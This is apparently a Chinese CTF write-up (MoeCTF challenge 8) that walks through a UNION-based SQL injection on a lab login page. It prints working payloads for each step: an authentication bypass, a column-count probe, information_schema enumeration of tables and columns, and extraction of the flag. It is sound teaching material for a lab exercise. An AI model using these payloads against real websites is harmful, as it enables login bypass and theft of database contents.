---
title: "SQL 注入：基于 UNION 的数据提取"
date: 2026-10-08
description: "MoeCTF 第八题 WriteUp —— 从登录页面出发，利用 UNION SELECT 逐步获取数据库结构并拿到 flag。"
tags: ["CTF", "SQL注入", "Web安全"]
---

这是一道经典的 SQL 注入题，考的是 UNION-based 注入。目标是一个登录页面，我们需要通过注入拿到隐藏在数据库里的 flag。

## 前置知识

在第六题中已经确认登录接口存在 SQL 注入，使用万能密码可以绕过认证：

```sql
admin' -- -
```

返回 `welcome admin`，说明后端拼接 SQL 时没有做参数化处理，单引号闭合后注释掉了密码校验。

## 判断列数

登录系统通常查询用户名和密码，猜测查询结果有两列。用 `UNION SELECT` 验证：

```sql
admin' UNION SELECT 'a', 'b' -- -
```

返回不变（仍然是 `welcome admin`），说明两列猜测正确。如果列数不对，数据库会报错。

## 控制回显位置

上一步返回的仍然是 `admin` 的数据，因为 `admin` 在表里确实存在，查询结果的第一行就是它。前端只取第一行第一列来显示。

让第一个条件查不到数据，这样 UNION 拼接的结果就会出现在第一行：

```sql
abc' UNION SELECT 'a', 'b' -- -
```

返回 `welcome a`，确认了回显位置是第一行第一列。

## 枚举数据库结构

### 查表名

利用 `information_schema.tables` 查当前数据库有哪些表，用 `GROUP_CONCAT` 把多行结果合并成一行：

```sql
a' UNION SELECT GROUP_CONCAT(table_name), 'x' FROM information_schema.tables WHERE table_schema=database() -- -
```

返回 `flag,users`。目标明确：`flag` 表。

### 查列名

```sql
a' UNION SELECT GROUP_CONCAT(column_name), 'x' FROM information_schema.columns WHERE table_schema=database() AND table_name='flag' -- -
```

返回 `value`。`flag` 表只有一个 `value` 列。

## 拿 flag

```sql
a' UNION SELECT value, 'x' FROM flag -- -
```

得到 flag：`moectf{UNl0n_B@sed_sQL1-fTW1l130d83e0f}`

## 小结

这道题的核心思路：

1. **确认注入点**：单引号闭合 + 注释截断
2. **判断列数**：`UNION SELECT` 试列数，不报错就对了
3. **控制回显**：让原查询返回空，UNION 的数据顶上去
4. **信息收集**：`information_schema` 是 MySQL 的元数据库，存了所有表和列的信息
5. **提取数据**：定位到目标表和列，直接查
